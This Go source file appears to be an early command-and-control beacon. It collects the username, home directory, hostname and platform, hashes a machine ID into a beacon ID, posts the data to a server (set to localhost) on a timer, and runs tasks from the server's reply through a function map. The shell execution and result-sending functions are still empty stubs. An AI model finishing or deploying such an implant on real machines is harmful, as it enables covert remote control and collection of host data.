package main

import (
	"bytes"
	"crypto/sha1"
	"encoding/hex"
	"encoding/json"
	"io/ioutil"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"time"

	"github.com/denisbrodbeck/machineid"
)

// Define Base URL
var base_url = "http://localhost:5000/api/v1/ping"

// Get details from userspace
var user_object, user_error = user.Current()
var beacon_username = user_object.Username
var beacon_directory = user_object.HomeDir

// Get basic OS info (platform, hostname etc)
var beacon_hostname, hostname_error = os.Hostname()
var beacon_platform = runtime.GOOS
var beacon_id = ""

// Default timeout for beacon
var beacon_timer int = 20
var exit_process = false

// Map variable functions to map, used to call function by string-based variable
var function_mapping = map[string]func(string) string{
	"exec_shell": exec_shell,
}

func main() {
	// Generate global beacon_id and start beaconin process (same thread)
	generate_id()
	start_beacon()
}

func exec_shell(input string) string {
	return input
}

func generate_id() {
	// Generate unique beacon ID based on machine ID and Username
	machine_id, machine_error := machineid.ID()
	if machine_error != nil {
		os.Exit(3)
	}

	// Concat machine ID and username and generate SHA1 hash as beacon_id
	concat_id := machine_id + beacon_username
	base_sha := sha1.New()
	base_sha.Write([]byte(concat_id))
	beacon_id = hex.EncodeToString(base_sha.Sum(nil))
}

func beacon_data() []byte {
	// Create default mapping of core agent data
	base_content := map[string]interface{}{"beacon_id": beacon_id, "working_dir": beacon_directory,
		"username": beacon_username, "hostname": beacon_hostname, "platform": beacon_platform,
		"timer": beacon_timer, "data": map[string]string{}}
	json_content, _ := json.Marshal(base_content)
	return json_content
}

func send_result(task_result string) {

}

func execute_tasks(tasks_mapping []interface{}) {
	// Foreach task execute command
	for _, task := range tasks_mapping {
		task_mapping := task.(map[string]interface{})
		command := task_mapping["command"].(string)
		command_input := task_mapping["input"].(string)
		command_sleep := task_mapping["timer"].(float64)
		command_result := function_mapping[command](command_input)
		send_result(command_result)
		time.Sleep(time.Duration(command_sleep) * time.Second)
	}
}

func send_pulse() interface{} {
	// Send core agent data to back-end API
	core_json := beacon_data()
	response, response_error := http.Post(base_url, "application/json", bytes.NewBuffer(core_json))
	if response_error != nil {
		_ = response_error
	}
	// Parse HTTP response content
	response_content, read_error := ioutil.ReadAll(response.Body)
	if read_error != nil {
		_ = read_error
	}
	// Parse response content as JSON and convert to interface mapping
	var json_values interface{}
	json_response := json.Unmarshal(response_content, &json_values)
	if json_response != nil {
		_ = json_response
	}
	return json_values
}

func start_pulse() {
	// Send pulse and map output to map object
	pulse_result := send_pulse()
	pulse_mapping := pulse_result.(map[string]interface{})

	// Get available tasks and map to interface slice
	tasks_result := pulse_mapping["tasks"]
	tasks_mapping := tasks_result.([]interface{})
	execute_tasks(tasks_mapping)

}

func start_beacon() {
	// Run beaconing process and spawn threads after execution
	// Sleep for X seconds defined by timer
	for exit_process == false {
		go start_pulse()
		time.Sleep(time.Duration(beacon_timer) * time.Second)
	}
}
